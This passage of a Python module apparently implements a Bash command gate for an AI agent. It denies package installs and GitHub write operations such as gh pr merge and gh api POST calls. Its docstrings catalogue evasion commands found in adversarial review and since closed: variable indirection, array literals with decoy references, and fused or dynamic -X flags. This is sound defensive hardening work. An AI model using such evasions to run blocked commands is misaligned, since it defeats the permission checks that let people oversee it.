    leading decoy had already collapsed away, since the REAL first
    surviving element is what a `seg[0]`-anchored rule would actually see
    once `"${NAME[@]}"` expands the array for real, not the decoy
    reference the raw token stream shows in that position.

    Takes NAME_TO_RAW_VALUE (case-preserving), not the lowercased
    NAME_TO_VALUE -- ported from `_token_is_all_unassigned_refs`'s own
    thirtieth-round fix (see its own docstring): this function's caller
    already has the case-preserving map in scope, and passing the
    lowercased one here would silently reintroduce that same round's own
    case-fold bug at this call site too."""
    i = 0
    n = len(tokens)
    while i < n and _token_is_all_unassigned_refs(tokens[i], name_to_raw_value):
        i += 1
    return tokens[i:]


def _strip_array_literal_newlines(tokens: list[str]) -> list[str]:
    """Remove every literal `"\\n"` token from TOKENS (an array literal's
    own inner element list, as `_rule_array_literal_content` below
    extracts it) EXCEPT one genuinely inside a nested `$(...)` command-
    substitution span within that content -- see that function's own
    docstring (issue #1350) for why a newline elsewhere there is ordinary
    IFS whitespace between array elements, never a statement separator,
    unlike everywhere else in this module, while a `$(...)` span's own
    content is still a real command list where the same newline is a
    genuine statement separator.

    Recognizes a nested span via `_command_substitution_token_span`
    (the SAME `$`-prefixed-token-then-`(` detector `_fold_command_
    substitution_spans`/`_rule_command_substitution_content` already use
    elsewhere in this module) and copies it through untouched, rather
    than tracking generic `(`/`)` nesting depth by bare token equality --
    found live during independent adversarial review of this same fix's
    own first version, which did track depth that way: a bare `(`/`)`
    token is indistinguishable, once shlex has dequoted it, from a
    QUOTED literal parenthesis CHARACTER used as ordinary array-element
    DATA (`A=(x '(' pip` + a real newline + `install foo); "${A[@]}"` --
    confirmed live via `declare -p` that real bash parses this as a
    plain five-element array, `x`, `(`, `pip`, `install`, `foo`, the
    quoted `(` never nesting anything at all) -- the depth-counting
    version therefore misread that one stray data element as opening an
    unclosed subshell, leaving every later newline (here, the one real
    bash treats as ordinary whitespace between `pip` and `install`)
    wrongly un-stripped, which then split `pip`+`install` into two
    segments and defeated `_rule_a_literal`'s own same-segment adjacency
    check -- the exact bug class this issue exists to close, reopened by
    this function's own first, too-permissive nesting heuristic. Real
    bash's own parser never confuses a quoted character with a structural
    operator; recognizing only the unambiguous `$(` shape (never a bare,
    unqualified `(`) is what actually matches that distinction, and a
    bare non-`$`-prefixed `(...)` has no real use as array-element DATA
    in bash in the first place (an uncaptured subshell contributes no
    word at all), so nothing genuine is lost by no longer treating one as
    a protected span."""
    out: list[str] = []
    i = 0
    n = len(tokens)
    while i < n:
        span_end = _command_substitution_token_span(tokens, i)
        if span_end is not None:
            out.extend(tokens[i:span_end])
            i = span_end
            continue
        if tokens[i] != "\n":
            out.append(tokens[i])
        i += 1
    return out


def _rule_array_literal_content(
    tokens: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> tuple[str | None, bool, tuple[str, ...]]:
    """Recursively classify each `NAME=(...)` array-literal span's OWN
    inner content through this module's full rule set -- bash genuinely
    expands `"${NAME[@]}"` into that content as real argv the instant the
    array is referenced, so anything that would be denied as a top-level
    command is just as dangerous sitting inside an array literal's own
    element list. Mirrors `_rule_command_substitution_content`'s own
    established architecture for `$(...)` spans exactly: detect the span,
    recursively classify its own inner TOKENS directly (no lossy
    token-list-to-string-and-back round trip), and treat this as fully
    independent of whatever `_fold_array_literal_spans` later does to the
    SAME span for its own, unrelated false-positive-avoidance purpose
    (see that function's own docstring) -- this function is the guarantor
    of array-literal content-safety, run BEFORE any folding, WITHIN the
    scope described below (a disclosed residual remains -- see the
    nineteenth-round paragraph).

    NAME_TO_VALUE/NAME_TO_RAW_VALUE are the OUTER command's own assigned
    variables (the same dicts `_classify_tokens` already computes for its
    own top-level rules) -- passed through to the recursive `_classify_
    tokens` call below as that call's own OUTER_NAME_TO_VALUE/OUTER_NAME_
    TO_RAW_VALUE, since a bare `$G` inside the array literal genuinely
    resolves against the SAME shell scope as the rest of the command at
    real bash runtime (an array literal is not a subshell), not just
    against whatever the array's own inner tokens happen to assign
    (ordinarily nothing).

    Every candidate span's inner content is checked TWICE: once as-is,
    and once with any leading run of unassigned bare `$NAME` references
    stripped via `_strip_leading_unassigned_bare_refs` (see its own
    docstring for why) -- denied if EITHER reading is denied, since this
    classifier cannot know at gate time whether such a reference is
    genuinely unset (word-splits away) or inherited-and-set from the
    real environment (stays as its own element); failing closed on
    whichever reading is more dangerous is the same posture this
    module's own `_write_method_candidate_hit`/`_resolve_seg_tokens_
    candidates` already take for an unresolvable candidate set.

    Found live by Step 8 independent review, eighteenth round (issue
    #1326): `A=($NEVERSET uv install); "${A[@]}" foo` and `A=($NEVERSET
    gh pr merge 1); "${A[@]}"` were both wrongly ALLOWED under every
    prior round's own fold-condition heuristic (fold unconditionally;
    fold if any element dynamic; fold if only the first element is
    dynamic) -- each treated `$NEVERSET` as an ordinary dynamic first
    element, folding the WHOLE span into one `NAME=`-prefixed token that
    `_strip_leading_assignments` then discarded entirely as inert,
    hiding the fully literal `uv`/`install`/`gh`/`pr`/`merge` tokens
    sitting right after the decoy reference. Confirmed live via a real
    bash proxy (stand-in `uv`/`gh` binaries on PATH, capturing their own
    argv) that both genuinely invoke the denied tool once `"${A[@]}"`
    expands. No purely fold-side condition can close this in general --
    the fold has no way to know, from token shape alone, whether a
    dynamic-looking first element will actually SURVIVE to occupy that
    position at real bash runtime -- so this recursive, fold-independent
    check replaces trying to further narrow the fold condition.

    Found live by Step 8 independent review, nineteenth round (issue
    #1326): the eighteenth round's own recursive `_classify_tokens` call
    dropped the OUTER scope entirely, re-deriving `name_to_value`/`name_
    to_raw_value` from the array's own inner tokens alone -- `G=gh; P=pr;
    M=merge; A=($G $P $M); "${A[@]}" 1` was wrongly ALLOWED, even though
    `$G`/`$P`/`$M` resolve to a denied `gh pr merge` at real bash runtime
    (confirmed live via `declare -p`) the SAME way they would if `$G $P
    $M` appeared directly at the top level of the command instead of
    inside an array literal. Closed by threading the outer scope through.
    Disclosed residual: `_rule_command_substitution_content`'s own,
    pre-existing (since the fourteenth round) recursive checks have the
    identical outer-scope gap and are NOT fixed by this round -- a tool/
    verb built from a variable assigned outside a `$(...)` span's own
    text is still invisible to that recursive check. Not closed here:
    closing it needs `classify()`'s own string-based entry point (used
    for the quoted/fused `$(...)` shape) to also accept an outer scope,
    a larger change than this round's own confirmed finding warranted.

    Found live during independent adversarial review of issue #1350's own
    newline fix: `NAME=(...)` parens denote a bash WORD LIST (a compound
    assignment), not a command list, so a literal newline typed between
    two array elements (bash happily accepts one, spanning the assignment
    across physical source lines) is ordinary IFS whitespace separating
    ELEMENTS, exactly like a plain space -- never a statement separator,
    unlike a `$(...)` command substitution's own content (a real command
    list, where `_rule_command_substitution_content`'s identical newline-
    as-separator treatment is correct and unchanged). Left as a raw token
    the recursive `_classify_tokens` call below would treat like any
    top-level newline, splitting a fully literal array into fake
    "segments" the same way this issue's own original bug did at the top
    level -- confirmed live that `A=(gh` + a real newline + `pr merge 1);
    "${A[@]}"` genuinely expands to a denied `gh pr merge 1` invocation at
    real bash runtime, yet was wrongly ALLOWED here without this strip
    (this module's own `_rule_a_literal` needs `gh`/`pr`/`merge` adjacent
    in the SAME segment; the task-scoped sibling module's own absolute,
    position-independent `gh` deny happened to still catch this one
    specific example, but not the equivalent `pip`/`install` shape,
    confirmed live to also wrongly ALLOW there). Closed by `_strip_array_
    literal_newlines` below, applied to INNER immediately at extraction,
    before either reading is built -- depth-aware (tracks `(`/`)` nesting
    the same way `_array_literal_token_span` itself does), so a newline
    genuinely nested inside a `$(...)`/`(...)` construct WITHIN the
    array's own inner content (still a real command list there) is left
    untouched for the recursive call to classify correctly."""
    is_git_push = False
    checkout_restore_paths: list[str] = []
    i = 0
    n = len(tokens)
    while i < n:
        end = _array_literal_token_span(tokens, i)
        if end is None:
            i += 1
            continue
        inner = _strip_array_literal_newlines(tokens[i + 2 : end - 1])
        if inner:
            readings = [(inner, "")]
            collapsed = _strip_leading_unassigned_bare_refs(inner, name_to_raw_value)
            if collapsed and collapsed != inner:
                readings.append((collapsed, " once its own leading unassigned reference(s) word-split away"))
            for reading, suffix in readings:
                reading_verdict = _classify_tokens(reading, name_to_value, name_to_raw_value)
                is_git_push = is_git_push or reading_verdict.is_git_push
                checkout_restore_paths.extend(reading_verdict.checkout_restore_paths)
                if reading_verdict.deny:
                    reason = f"an array literal NAME=(...) embeds a denied command{suffix} -- {reading_verdict.reason}"
                    return reason, is_git_push, tuple(checkout_restore_paths)
        i = end
    return None, is_git_push, tuple(checkout_restore_paths)


# --- Denylists -----------------------------------------------------------
# uv add/remove are deliberately absent (PR #1323 / issue #1320): they
# mutate pyproject.toml/uv.lock, a declarative, PR-diff-visible change,
# unlike uv pip install/bare uv install.

_DENIED_ADJACENT: list[tuple[str, ...]] = [
    ("pip", "install"),
    ("pip3", "install"),
    ("npm", "install"),
    ("npm", "i"),
    ("yarn", "add"),
    ("pnpm", "add"),
    ("go", "install"),
    ("brew", "install"),
    ("apt", "install"),
    ("apt-get", "install"),
    ("gem", "install"),
    ("cargo", "install"),
    ("uv", "pip", "install"),
    ("uv", "install"),
    ("plugin", "install"),
    ("gh", "issue", "create"),
    ("gh", "issue", "edit"),
    ("gh", "issue", "close"),
    ("gh", "issue", "comment"),
    ("gh", "issue", "delete"),
    ("gh", "issue", "reopen"),
    ("gh", "issue", "transfer"),
    ("gh", "issue", "pin"),
    ("gh", "issue", "unpin"),
    ("gh", "issue", "lock"),
    ("gh", "issue", "unlock"),
    ("gh", "issue", "develop"),
    ("gh", "pr", "create"),
    ("gh", "pr", "edit"),
    ("gh", "pr", "close"),
    ("gh", "pr", "comment"),
    ("gh", "pr", "merge"),
    ("gh", "pr", "review"),
    ("gh", "pr", "ready"),
    ("gh", "pr", "reopen"),
    ("gh", "pr", "lock"),
    ("gh", "pr", "unlock"),
    ("gh", "pr", "update-branch"),
]
_DENIED_PHRASES = [" ".join(pattern) for pattern in _DENIED_ADJACENT]

_WATCHED_TOOLS = {
    "pip",
    "pip3",
    "npm",
    "pnpm",
    "yarn",
    "uv",
    "go",
    "brew",
    "apt",
    "apt-get",
    "gem",
    "cargo",
    "gh",
    "git",
    "plugin",
}
# Leaf verbs/subcommands denied for at least one tool above -- used only as
# the dynamic-indirection suspicion signal for the B-rules below, never as
# a standalone deny list on its own (a literal command is only denied by
# _DENIED_ADJACENT/_DENIED_PHRASES or the gh-api/git-push checks).
_WATCHED_VERBS = {
    "install",
    "i",
    "add",
    "merge",
    "create",
    "edit",
    "close",
    "comment",
    "delete",
    "reopen",
    "transfer",
    "pin",
    "unpin",
    "lock",
    "unlock",
    "develop",
    "review",
    "ready",
    "update-branch",
    # "api" is not a denied-adjacent verb on its own (a plain `gh api
    # <read-path>` is legitimate) -- it is included here only so the B1a/
    # B1b indirection rules recognize `gh`+`api` as a suspicious pairing
    # when BOTH are hidden behind variables (`G=gh; A=api; $G $A ... -X
    # POST`), the same way they already recognize `gh`+`merge` for
    # `gh pr merge` indirection. Found live by Step 8 independent review,
    # fourth round (issue #1326): a literal `gh` with a dynamic
    # subcommand was already caught by Rule B2, but BOTH tool and
    # subcommand dynamic evaded every existing rule, since `_rule_gh_api_
    # write`'s own write-detection logic (the -X/-f flag checks) is not
    # wired into the B-rule indirection machinery at all. Once indirection
    # is detected this way the whole `gh api` invocation is denied
    # outright, without inspecting whether it would have been a read or a
    # write once resolved -- the same "cannot confidently classify a
    # resolved-only-at-runtime command, so deny" posture the other B-rules
    # already take.
    "api",
}
_GIT_PUSH_VERB = "push"

_WRITE_METHODS = {"post", "put", "patch", "delete"}


class Verdict(NamedTuple):
    deny: bool
    reason: str
    is_git_push: bool
    # Issue #1375: every path a `git checkout`/`git restore` invocation in
    # this command could discard, extracted soundly with no live I/O (see
    # the "git checkout/restore path extraction" section below). Defaults
    # to `()` -- every pre-existing `Verdict(...)` call site in this module
    # denies for a reason unrelated to checkout/restore, where this field
    # is never read (hooks/check-bash-safety.sh's own new wrapper step,
    # like its existing `is_git_push` step, only ever runs on the "allow"
    # decision), so none of them need updating for this new field.
    checkout_restore_paths: tuple[str, ...] = ()


def _rule_a_literal(segments: list[list[str]]) -> str | None:
    """Sound: matches only against the dequoted literal-token stream, so
    quote-splitting and backslash-escaping (already resolved by shlex) and
    ${IFS} substitution (already resolved by _ifs_split) are closed for
    free, plus a same-token literal-phrase fallback for the case where an
    entire denied phrase survives inside one quoted argument (e.g.
    `echo "uv install foo" | bash`, `$(echo "uv install foo")`)."""
    for seg in segments:
        literals = [t.lower() for t in seg if not _is_dynamic(t)]
        for pattern in _DENIED_ADJACENT:
            n = len(pattern)
            for i in range(len(literals) - n + 1):
                if tuple(literals[i : i + n]) == pattern:
                    return f"a Bash command matching a denied verb sequence ({'+'.join(pattern)})"
        for literal in literals:
            for phrase in _DENIED_PHRASES:
                if phrase in literal:
                    return f"a Bash argument containing the denied phrase '{phrase}'"
    return None


_METHOD_FLAG_HIT = "a 'gh api' write call (-X/--method POST/PUT/PATCH/DELETE)"
_METHOD_FLAG_DYNAMIC_HIT = (
    "a 'gh api' write call with a dynamically constructed -X/--method value assigned from a denied write method"
)
_FIELD_FLAG_HIT = "a 'gh api' call with a field flag (-f/-F/--field/--raw-field)"


def _gh_api_method_literal_hit(literals: list[str]) -> bool:
    """Literal `-X`/`--method` flag, as a separate token, fused with `=`,
    or fused directly, whose value is itself a literal write method.

    The fused-directly case (`-X`+value in ONE token, e.g. `-XPOST`) also
    covers the fused-directly-WITH-`=`-separator shape (`-X=POST`) via
    its own `.lstrip("=")` -- found live by Step 8 independent review,
    sixteenth round (issue #1326): `gh api repos/o/r/issues/1 -X=POST`
    was wrongly ALLOWED, since `tok[2:]` on `-x=post` is `=post`, which
    does not itself start with any write method -- confirmed against
    `gh`'s own flag-parsing library (pflag, the same library `gh api`
    registers `-X`/`--method` through) that a single fused argv token
    `-X=POST` genuinely parses to `method=POST`, a real write (unlike
    `-X` and `=POST` as two SEPARATE argv tokens, which pflag does not
    treat as the flag's value at all -- not exploitable, not changed
    here). The separate-token case above already had this exact
    `.lstrip("=")` treatment; this was the one shape missing it."""
    for i, tok in enumerate(literals):
        if tok in ("-x", "--method") and i + 1 < len(literals):
            value = literals[i + 1].lstrip("=")
            if any(value.startswith(m) for m in _WRITE_METHODS):
                return True
        if tok.startswith("-x") and len(tok) > 2 and any(tok[2:].lstrip("=").startswith(m) for m in _WRITE_METHODS):
            return True
        if tok.startswith("--method=") and any(tok[len("--method=") :].startswith(m) for m in _WRITE_METHODS):
            return True
    return False


def _token_is_unambiguously_vanishing(
    token: str, name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """Stricter than `_token_is_all_unassigned_refs`: TRUE only when TOKEN
    vanishes to nothing under EVERY possible original-quoting reading, not
    just the maximal-munch one `_token_is_all_unassigned_refs` itself
    checks -- an UNBRACED bare name is also run through `_unbraced_ref_
    options` (the same ambiguity primitive `_substitute_var_refs_
    candidates` uses) to rule out a SHORTER assigned prefix that would
    make the token resolve to real text instead (shlex has already lost
    whether a raw token like `$aost` was originally `$aost`, bare, or
    `"$ao"st`, a quoted `$ao` reference fused with literal "st"). Used
    ONLY by `_value_position_after`'s own skip-loop below, deliberately
    NOT folded into `_token_is_all_unassigned_refs` itself -- see that
    function's own docstring for the live regression this narrower
    scoping fixes: every OTHER caller of the plain check wants "vanishes
    under the straightforward reading," and additionally distrusting a
    coincidental shorter-prefix match there (e.g. an outer array literal
    assignment's own NAME happening to prefix an unrelated inner
    reference) silently disabled their own stripping/skipping instead of
    protecting anything.

    Found live by Step 8 independent review, twenty-second round (issue
    #1326), as the fix that replaces the rejected broader version of
    this same idea.

    Takes BOTH NAME_TO_VALUE and NAME_TO_RAW_VALUE, unlike most of this
    module's other internal helpers that take only one -- ported from
    `_token_is_all_unassigned_refs`'s own thirtieth-round fix (see its
    own docstring): the vanishing check below now needs the case-
    preserving map (real bash `$IFS` word-splitting is case-sensitive),
    but `_unbraced_ref_options` above still needs the lowercased one,
    since its own candidate strings feed a case-INSENSITIVE write-method
    keyword comparison downstream -- the two uses are genuinely
    different questions, not a redundant pair."""
    if not _token_is_all_unassigned_refs(token, name_to_raw_value):
        return False
    for match in _REF_RUN_NAME_RE.finditer(token):
        bare_name = match.group("bare")
        if bare_name is not None and _unbraced_ref_options(bare_name, name_to_value):
            return False
    return True


def _value_position_after(
    seg: list[str], flag_index: int, name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> str | None:
    """The token following a flag at `seg[flag_index]`, skipping PAST any
    leading run of vanishing-reference decoys first -- falls back to the
    token immediately adjacent to the flag when skipping finds nothing
    further, so a single, merely-unresolved-in-this-scope token (not a
    genuine decoy with a real value beyond it) is still returned rather
    than silently dropped. Returns None only when there is no token at
    all past the flag, matching every prior caller's own established
    `continue`/`None` behavior for that case.

    Found live by Step 8 independent review, twenty-second round (issue
    #1326), as the second half of the same fix that added the
    skip-vanishing-decoys loop to `_gh_api_method_dynamic_value` and
    `_gh_api_method_flagname_dynamic_hit` below: the first version of
    that loop skipped past a leading decoy but then, finding nothing
    further, gave up entirely (`return None`) instead of falling back to
    the token right after the flag -- wrongly treating a single,
    merely-unresolved token in that position (e.g. `-x $a` with `a` not
    in scope, which many existing tests construct deliberately) as a
    vanished decoy rather than the value itself. Shared here so both
    callers -- and any future one needing the same "skip a decoy, but
    never lose the one real candidate" shape -- stay in sync."""
    j = flag_index + 1
    while j < len(seg) and _token_is_unambiguously_vanishing(seg[j], name_to_value, name_to_raw_value):
        j += 1
    if j < len(seg):
        return seg[j]
    if flag_index + 1 < len(seg):
        return seg[flag_index + 1]
    return None


def _gh_api_method_dynamic_value(
    seg: list[str], index: int, raw_tok: str, name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> str | None:
    """The dynamically constructed value part of a `-X`/`--method` flag at
    `seg[index]`, in whichever of the three shapes it takes (separate
    token, fused with `=`, or fused directly) -- or None if `raw_tok`
    is not a `-X`/`--method` flag carrying a dynamic value at all.

    Found live by Step 8 independent review, twenty-second round (issue
    #1326): the separate-token case used to read `seg[index + 1]`
    directly, assuming the value always sits immediately after the flag
    -- a leading decoy interposed there (`-X $NEVERSET $M`, NEVERSET
    never assigned) made this function return the DECOY itself as "the
    value," which `_substitute_var_refs_candidates` then correctly
    reported unresolvable (`[]`), silently missing the real value one
    position further. A LITERAL value past the same decoy (`-X $NEVERSET
    POST`) was already caught, unaffected, by `_gh_api_method_literal_
    hit`'s own dynamic-filtered adjacency scan -- confirmed live this gap
    was scoped to the doubly-dynamic case alone (decoy AND the real value
    both unresolved-as-written). Closed by skipping (not stopping at) a
    vanishing token here too, the same primitive `_skip_fetch_exec_
    wrapper`'s own twenty-first-round fix already uses for an analogous
    position in the task-scoped sibling module."""
    if _is_dynamic(raw_tok):
        lowered_tok = raw_tok.lower()
        # `.lstrip("=")`: `-x=$var` and `-x$var` both slice to a value part
        # starting with the shape's own separator character (`=`) or none
        # at all -- stripping it here matches `_gh_api_method_literal_hit`'s
        # own established `.lstrip("=")` treatment for its separate-token
        # case, and keeps the value part a clean comparand for
        # `_substitute_var_refs_candidates`'s reconstructed-string check below, which
        # (unlike the old per-variable-name lookup this replaced) preserves
        # every character of surrounding literal text rather than ignoring
        # a leading "=" incidentally.
        if lowered_tok.startswith("-x") and len(raw_tok) > 2:
            return raw_tok[2:].lstrip("=")
        if lowered_tok.startswith("--method="):
            return raw_tok[len("--method=") :]
        return None
    if raw_tok.lower() in ("-x", "--method"):
        value_tok = _value_position_after(seg, index, name_to_value, name_to_raw_value)
        if value_tok is not None and _is_dynamic(value_tok):
            return value_tok
    return None


def _write_method_candidate_hit(candidates: list[str] | None) -> bool:
    """True if any reading in CANDIDATES (from
    `_substitute_var_refs_candidates`) is a write method, OR CANDIDATES is
    None -- too many readings to enumerate soundly, so treated as an
    unresolved-but-plausible match rather than silently dropped (fail
    closed, matching this module's own established posture for a
    cannot-confidently-classify case)."""
    if candidates is None:
        return True
    return any(candidate.lower().startswith(method) for candidate in candidates for method in _WRITE_METHODS)


def _gh_api_method_dynamic_hit(
    seg: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """A `-X`/`--method` flag whose VALUE is itself dynamically
    constructed -- as a separate token (`-X $M`), fused with `=` (`-X=$M`,
    `--method=$M`), or fused directly (`-X$M`, `-X"$M"` -- shlex dequotes
    the quoted form to the same single token as the unquoted one) --
    resolved via `name_to_value`. Checked separately from
    `_gh_api_method_literal_hit`: the literal-token scan there filters
    every dynamic token out first, so it can never see that a value was
    even present, let alone what it resolves to -- found live by Step 8
    independent review (issue #1326), in two rounds: the separate-token
    form first (`M=POST; gh api .../merge -X $M` resolved to a real
    write and was wrongly allowed), then the fused forms in a second
    round after the first fix landed. Resolved via
    `_substitute_var_refs_candidates` (not a per-variable value set):
    found live by Step 8 independent review, sixth round (issue #1326) --
    `-X "$M1$M2"` with `M1=PO`, `M2=ST` resolves to a real `POST` write
    once bash concatenates the two references, but checking each
    referenced variable's value separately (the prior approach) never
    recognized the concatenation, since neither "po" nor "st" alone is a
    write method. The reconstructed string is lowercased before
    comparison -- `_substitute_var_refs_candidates` preserves a token's
    literal text exactly as typed (only the substituted variable values
    are already-lowercased), so a literal fragment fused with a variable
    in the SAME token (`-X "PO$M"` with `M=ST`) reconstructs to "POst",
    not "post" -- found live by Step 8 independent review, seventh round
    (issue #1326): every existing test for this fix used a
    whole-variable-per-fragment split (`M1=PO; M2=ST`), which happens to
    already be all-lowercase after `_assigned_literals`'s own
    lowercasing, so this literal-fragment gap went unexercised. Every
    candidate reading `_substitute_var_refs_candidates` returns is
    checked (via `_write_method_candidate_hit`), not just one -- found
    live by Step 8 independent review, eighth round (issue #1326): an
    unbraced reference immediately followed by more identifier-shaped
    literal text (`-X"$M"ST` with `M=PO`) is itself ambiguous once shlex
    has dequoted it, see `_substitute_var_refs_candidates`'s own
    docstring. `name_to_raw_value` was originally threaded through
    purely to reach that function's own `${!NAME}` indirect-reference
    support (found live by Step 8 independent review, tenth round, issue
    #1326) -- as of the thirtieth round it is ALSO passed to `_gh_api_
    method_dynamic_value` below, which needs it for `_value_position_
    after`'s own case-preserving vanishing check (see `_token_is_all_
    unassigned_refs`'s own docstring)."""
    for i, raw_tok in enumerate(seg):
        dynamic_value_part = _gh_api_method_dynamic_value(seg, i, raw_tok, name_to_value, name_to_raw_value)
        if dynamic_value_part is None:
            continue
        if _is_unresolvable_substitution(dynamic_value_part):
            return True
        candidates = _substitute_var_refs_candidates(dynamic_value_part, name_to_value, name_to_raw_value)
        if _write_method_candidate_hit(candidates):
            return True
    return False


def _gh_api_method_flagname_dynamic_hit(
    seg: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """The -X/--method flag NAME ITSELF hidden behind a bare variable
    reference as its own token (`F=-X; gh api .../merge $F POST`), with
    the write-method value following as a separate token -- literal or
    itself a bare variable reference. Found live by Step 8 independent
    review, fifth round (issue #1326): every prior fix here assumed the
    flag token itself carried a literal "-x"/"--method" text prefix
    somewhere in it; a token that is PURELY a variable reference has no
    such prefix, so neither the literal-token scan
    (`_gh_api_method_literal_hit`) nor the fused-value dynamic scan
    (`_gh_api_method_dynamic_hit`) above ever recognized it as a flag at
    all -- both key off literal text inside the token, and this token has
    none. The value token is resolved via `_substitute_var_refs_candidates`
    (not `_resolve_bare_var`), so a write-method value split across
    multiple concatenated variables (`$F "$M1$M2"`) is caught too -- the
    same gap `_gh_api_method_dynamic_hit` above had, found live by Step 8
    independent review, sixth round (issue #1326), against this
    function's own flag-name-indirection case. The resolved value is
    lowercased before comparison for the same reason as
    `_gh_api_method_dynamic_hit` above -- found live by Step 8
    independent review, seventh round (issue #1326): a literal fragment
    fused with a variable in the same value token (`$F "PO$M"` with
    `M=ST`) reconstructs to "POst", not "post". Every candidate reading is
    checked (via `_write_method_candidate_hit`), for the same
    unbraced-reference-ambiguity reason as `_gh_api_method_dynamic_hit`
    above -- found live by Step 8 independent review, eighth round (issue
    #1326). The flag-name token is ALSO resolved via
    `_resolve_indirect_ref` (bash's own `${!NAME}` syntax), not just
    `_resolve_bare_var` -- found live by Step 8 independent review, tenth
    round (issue #1326): `FREF=F; F=-X; gh api .../merge ${!FREF} POST`
    resolves (real bash) to a real `-X POST` write and was invisible to
    the bare-reference-only check.

    The flag-name token is resolved via `_substitute_var_refs_candidates`
    (every sound reconstruction, fusion-aware), not the narrower
    `_resolve_bare_or_indirect` (whole-token bare/indirect reference
    only) -- found live by Step 8 independent review, twelfth round
    (issue #1326): round eleven's own claim that "a flag name is never
    fused with other text the way a value can be" was wrong. `M=method;
    gh api .../issues --$M POST` (real bash: resolves to a genuine
    `--method POST` write) was invisible to `_resolve_bare_or_indirect`,
    since the literal `--` prefix fused onto `$M` defeats its anchored
    `^...$` match -- the exact same fusion class round eleven closed for
    B1a/B1b/`_rule_gh_any`/etc., left open here under an incorrect
    premise. Any candidate set too large to enumerate soundly is treated
    as an unresolved-but-plausible match -- fail closed, matching
    `_gh_api_method_fused_flagname_dynamic_hit`'s own established
    posture.

    Found live by Step 8 independent review, twenty-second round (issue
    #1326): the value token used to be read directly as `seg[i + 1]`,
    assuming it always sits immediately after the (already-resolved)
    flag-name token -- a leading decoy interposed there (`$F $NEVERSET
    $M`, NEVERSET never assigned) made this function read the decoy
    itself as "the value," missing a real, dynamically-resolved write
    method one position further. Closed the same way as `_gh_api_method_
    dynamic_value`'s own twenty-second-round fix: skip (don't stop at) a
    vanishing token when looking for the value position."""
    for i, raw_tok in enumerate(seg):
        if not _is_dynamic(raw_tok):
            continue
        if _is_unresolvable_substitution(raw_tok):
            return True
        flag_candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
        if flag_candidates is None:
            return True
        if not any(candidate.lower() in ("-x", "--method") for candidate in flag_candidates):
            continue
        value_tok = _value_position_after(seg, i, name_to_value, name_to_raw_value)
        if value_tok is None:
            continue
        if _is_dynamic(value_tok):
            if _is_unresolvable_substitution(value_tok):
                return True
            candidates = _substitute_var_refs_candidates(value_tok, name_to_value, name_to_raw_value)
            if _write_method_candidate_hit(candidates):
                return True
        elif any(value_tok.lower().startswith(m) for m in _WRITE_METHODS):
            return True
    return False


def _gh_api_method_fused_flagname_dynamic_hit(
    seg: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """The -X/--method flag NAME hidden behind a variable reference FUSED
    directly with its own value in the SAME token -- e.g. `F=-X; gh api
    .../merge "$F"POST` dequotes (shlex, like real bash, drops which
    characters were quoted) to the single token `$FPOST`. Neither prior
    fix's own shape recognizes this: `_gh_api_method_flagname_dynamic_hit`
    above requires the flag token to be a BARE, anchored single reference
    (`$F` alone, nothing fused after it); `_gh_api_method_dynamic_hit`
    requires a literal "-x"/"--method" TEXT prefix already present in the
    token before it ever looks for a dynamic value -- `$FPOST` starts
    with `$`, not that literal text. Found live by Step 8 independent
    review, eighth round (issue #1326), immediately after closing the
    plain quote-boundary-ambiguity case above: real bash (confirmed via
    `bash -c` argv expansion) resolves `F=-X; gh api .../merge "$F"POST`
    to a real `-XPOST` write.

    Every candidate reconstruction of the WHOLE token (via
    `_substitute_var_refs_candidates`, which already tries every sound
    quote-boundary reading) is checked against the same fused-flag shapes
    `_gh_api_method_literal_hit` already recognizes for a literal
    token -- this is not a new detection rule, only extending an existing
    one to dynamic tokens whose resolved reading was not knowable until
    substitution, including that function's own sixteenth-round
    `.lstrip("=")` fix for the `-X=POST`-shaped fused-with-`=` case (see
    its own docstring) -- this function had the identical gap on a
    resolved candidate string, closed the same way."""
    for raw_tok in seg:
        if not _is_dynamic(raw_tok):
            continue
        if _is_unresolvable_substitution(raw_tok):
            return True
        candidates = _substitute_var_refs_candidates(raw_tok, name_to_value, name_to_raw_value)
        if candidates is None:
            return True
        for candidate in candidates:
            lowered = candidate.lower()
            if (
                lowered.startswith("-x")
                and len(candidate) > 2
                and any(lowered[2:].lstrip("=").startswith(m) for m in _WRITE_METHODS)
            ):
                return True
            if lowered.startswith("--method=") and any(
                lowered[len("--method=") :].startswith(m) for m in _WRITE_METHODS
            ):
                return True
    return False


def _gh_api_field_literal_hit(literals: list[str]) -> bool:
    """A literal `-f`/`-F`/`--field`/`--raw-field` token, as a separate
    token or fused with a literal value -- this rule never cares about
    the field VALUE, only the flag's presence."""
    for tok in literals:
        if tok in ("-f", "--field", "--raw-field"):
            return True
        if tok.startswith("-f") and len(tok) > 2:
            return True
        if tok.startswith("--field=") or tok.startswith("--raw-field="):
            return True
    return False


def _gh_api_field_dynamic_hit(seg: list[str]) -> bool:
    """A `-f`/`--field`/`--raw-field` flag fused directly with a dynamic
    value (`-f$X`, `--field=$X`, `--raw-field=$X`) makes the WHOLE token
    dynamic, so it never reaches `_gh_api_field_literal_hit`'s
    literal-token scan at all -- found live by Step 8 independent review,
    third round (issue #1326), the same fused-token gap the -X/--method
    fix had to close separately. No `name_to_value` lookup needed here:
    unlike the method flag, this rule never inspects the field value."""
    for raw_tok in seg:
        if not _is_dynamic(raw_tok):
            continue
        lowered_tok = raw_tok.lower()
        if lowered_tok.startswith("-f") and len(raw_tok) > 2:
            return True
        if lowered_tok.startswith("--field=") or lowered_tok.startswith("--raw-field="):
            return True
    return False


def _gh_api_field_flagname_dynamic_hit(
    seg: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """Same class as `_gh_api_method_flagname_dynamic_hit`, for
    -f/-F/--field/--raw-field: the flag NAME itself hidden behind a bare
    variable reference (`FF=--field; gh api ... $FF name=value`). Unlike
    the method flag, this rule never inspects the field value -- presence
    of the flag alone is denied, matching `_gh_api_field_literal_hit`'s
    own scope. `-F` is not listed separately: `name_to_value`'s own
